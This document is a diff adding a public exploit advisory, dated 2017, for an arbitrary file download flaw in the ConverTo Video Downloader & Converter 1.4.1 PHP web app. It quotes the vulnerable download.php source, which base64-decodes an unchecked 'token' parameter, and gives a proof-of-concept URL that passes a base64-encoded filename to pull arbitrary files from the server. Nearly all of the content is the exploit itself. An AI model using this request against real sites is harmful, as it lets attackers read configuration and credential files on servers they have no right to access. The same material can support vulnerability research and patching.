@@ -1,0 +1,45 @@
+# # # # # 
+# Exploit Title: ConverTo Video Downloader & Converter 1.4.1 - Arbitrary File Download
+# Dork: N/A
+# Date: 29.09.2017
+# Vendor Homepage: https://codecanyon.net/user/lemonadeflirt
+# Software Link: https://codecanyon.net/item/converto-video-downloader-converter/13225966
+# Demo: http://vd.googglet.com/
+# Version: 1.4.1
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The security obligation allows an attacker to arbitrary download files..
+#
+# Vulnerable Source:
+#
+# .............
+# <?php
+# 
+# include_once('.......php');
+# // Check download token
+# if (empty($_GET['mime']) OR empty($_GET['token']))
+# {
+# 	exit('Invalid download token 8{');
+# }
+# 
+# // Set operation params
+# $mime = filter_var($_GET['mime']);
+# $ext  = str_replace(array('/', 'x-'), '', strstr($mime, '/'));
+# $url  = base64_decode(filter_var($_GET['token']));
+# $name = urldecode($_GET['title']). '.' .$ext; 
+# 
+# ?>
+# .............
+# Proof of Concept:
+#
+# http://localhost/[PATH]/download.php?mime=video/webm&title=Efe&token=[FILENAME_to_BASE64]
+# 
+# Etc...
+# # # # #
